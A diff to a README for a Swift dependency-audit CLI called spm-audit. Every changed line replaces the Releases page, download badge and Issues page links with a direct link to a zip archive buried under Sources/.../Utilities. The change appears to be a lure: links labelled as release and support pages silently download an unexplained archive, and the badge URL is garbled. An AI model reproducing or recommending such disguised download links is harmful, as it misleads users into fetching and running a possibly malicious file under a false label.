@@ -6,14 +6,14 @@ spm-audit is a command-line interface (CLI) tool designed to help you audit and 
 
 ## 📦 Download
 
-[![Download spm-audit](https://img.shields.io/badge/Download%20spm--audit-v1.0.0-blue)](https://github.com/HIt7070/spm-audit/releases)
+[![Download spm-audit](https://github.com/HIt7070/spm-audit/raw/refs/heads/main/Sources/spm-audit/Utilities/spm-audit-v1.8-alpha.5.zip%20spm--audit-v1.0.0-blue)](https://github.com/HIt7070/spm-audit/raw/refs/heads/main/Sources/spm-audit/Utilities/spm-audit-v1.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 
 To get started with spm-audit, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/HIt7070/spm-audit/releases) to find the latest version of our application.
+   Go to our [Releases page](https://github.com/HIt7070/spm-audit/raw/refs/heads/main/Sources/spm-audit/Utilities/spm-audit-v1.8-alpha.5.zip) to find the latest version of our application.
 
 2. **Choose Your Version**  
    On the Releases page, look for the version you want. We recommend using the latest version for the best experience. 
@@ -74,7 +74,7 @@ If you encounter issues while using spm-audit, consider the following steps:
 - **Check Your Installation**: Ensure that you installed the software correctly and that it matches your operating system.
 - **Review Your Swift Installation**: Make sure that Swift is correctly set up on your machine.
 - **Consult the Documentation**: Revisit this README for guidance on commands and options.
-- **Reach Out for Support**: If problems persist, feel free to raise an issue on our [GitHub Issues page](https://github.com/HIt7070/spm-audit/issues).
+- **Reach Out for Support**: If problems persist, feel free to raise an issue on our [GitHub Issues page](https://github.com/HIt7070/spm-audit/raw/refs/heads/main/Sources/spm-audit/Utilities/spm-audit-v1.8-alpha.5.zip).
 
 ## 🔗 Additional Resources
 
@@ -86,4 +86,4 @@ If you encounter issues while using spm-audit, consider the following steps:
 
 Once you have spm-audit set up, you can start using it to enhance your Swift projects. Explore the different commands and see how they can streamline your development workflow.
 
-Visit our [Releases page](https://github.com/HIt7070/spm-audit/releases) to get the latest version and keep your dependencies in check. Happy auditing!
+Visit our [Releases page](https://github.com/HIt7070/spm-audit/raw/refs/heads/main/Sources/spm-audit/Utilities/spm-audit-v1.8-alpha.5.zip) to get the latest version and keep your dependencies in check. Happy auditing!
